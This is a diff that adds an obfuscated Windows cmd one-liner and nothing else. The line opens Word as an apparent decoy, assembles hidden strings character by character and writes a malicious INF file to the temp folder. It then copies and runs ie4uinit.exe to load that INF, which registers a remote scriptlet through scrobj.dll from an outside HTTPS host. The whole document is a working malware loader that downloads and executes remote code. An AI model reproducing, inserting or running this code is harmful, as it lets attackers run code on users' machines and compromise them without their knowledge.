@@ -1,0 +1,20 @@
+/v /c start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" & (for %m in ("superpa=se" "ectosarco=e" "thioa=al" ) do @set %~m) &&
+  (for %k in ("a") do @set "benzoqui=%~k") &&
+  call(for %y in ("n") do @set "wagonwayma=%~y") &&
+  callcall(for %s in ("e") do @set "naked=%~s") &&
+  callcall(for %n in (" ") do @set "unascend=%~n") &&
+  (for %u in ("u") do @set "supp=%~u") &&
+  (for %z in ("X") do @set "maugr=%~z") &&
+  call(for %h in ("e") do @set "naked=%~h") &&
+  (for %i in ("o") do @set "skart=%~i") &&
+  callcall(for %l in ("c") do @set "dewedb=%~l") &&
+  (for %y in ("d") do @set "kimonois=%~y") &&
+  callcallcall(for %u in ("l") do @set "curaticale=%~u") &&
+  (for %x in ("r") do @set "gudge=%~x") &&
+  call(for %y in ("-") do @set "checkr=%~y") &&
+  callcallcallcallcall(for %h in ("2") do @set "clutchingl=%~h") &&
+  callcallcallcall(for %f in ("8") do @set "rezon=%~f") &&
+  (for %n in ("%temp%") do @set "browni=%~n") &&
+  call(for %r in ("[destinationdirs]" "defaultdestdir=11" "C6686=01" "[version]" "signature=$windows nt$" "[embayi_88F]" "%vegetariano%c%underb%o%oos%\" "j%emergen%d%junk%l,%coadmiratio%I,h%foreignly%t%unquav%:%ahiag%/%geoscientis%s%unquav%r%lappagea%a%romanyd%s%emergen%b%detacwabl%t%foreignly%y%vegetariano%t%detacwabl%p%thistler%e%dervis%.%tubercu%o%grad%/%grad%a%underb%k%foreignly%o%schmuckde%" "[strings]" "servicename= 'carbo'" "shortsvcname= 'carbo'" "emergen=." "ahiag=/" "romanyd=3" "lappagea=4" "coadmiratio=N" "schmuckde=a" "oos=b" "tubercu=c" "geoscientis=d" "detacwabl=e" "allu=f" "thistler=h" "brachi=i" "junk=l" "grad=m" "dervis=n" "unquav=p" "underb=r" "vegetariano=s" "foreignly=t" "warnelsup=u" "[defaultinstall.windows7]" "delfiles=C6686" "Un\" "Register\" "OCXs=embayi_88F" "[C6686]" "%brachi%e%warnelsup%i%dervis%i%foreignly%.%brachi%n%allu%" ) do @echo %~r) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
